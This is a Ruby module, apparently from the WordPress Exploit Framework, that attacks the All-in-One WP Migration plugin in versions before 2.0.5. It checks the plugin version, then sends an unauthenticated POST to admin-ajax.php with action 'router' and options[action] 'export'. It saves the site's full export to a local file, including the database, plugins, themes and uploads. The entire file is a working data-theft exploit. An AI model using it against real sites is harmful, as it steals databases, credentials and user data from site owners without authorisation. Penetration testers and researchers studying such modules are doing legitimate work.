class Wpxf::Auxiliary::AllInOneMigrationExport < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'All-in-One Migration Export',
      desc: 'This module allows you to export WordPress data (such as the '\
            'database, plugins, themes, uploaded files, etc) via the '\
            'All-in-One Migration plugin in versions < 2.0.5.',
      author: [
        'James Golovich',                  # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['WPVDB', '7857'],
        ['URL', 'http://www.pritect.net/blog/all-in-one-wp-migration-2-0-4-security-vulnerability']
      ],
      date: 'Mar 19 2015'
    )

    register_options([
      IntegerOption.new(
        name: 'http_client_timeout',
        desc: 'Max wait time in seconds for HTTP responses',
        default: 300,
        required: true
      ),
      StringOption.new(
        name: 'export_path',
        desc: 'The file to save the export to',
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('all-in-one-wp-migration', '2.0.5')
  end

  def export_path
    normalized_option_value('export_path')
  end

  def run
    return false unless super

    emit_info 'Downloading website export...'
    res = download_file(
      url: wordpress_url_admin_ajax,
      method: :post,
      params: { 'action' => 'router' },
      body: { 'options[action]' => 'export' },
      local_filename: export_path
    )

    if res.timed_out?
      emit_error 'Request timed out, try increasing the http_client_timeout'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    emit_success "Saved export to #{export_path}"
    return true
  end
end
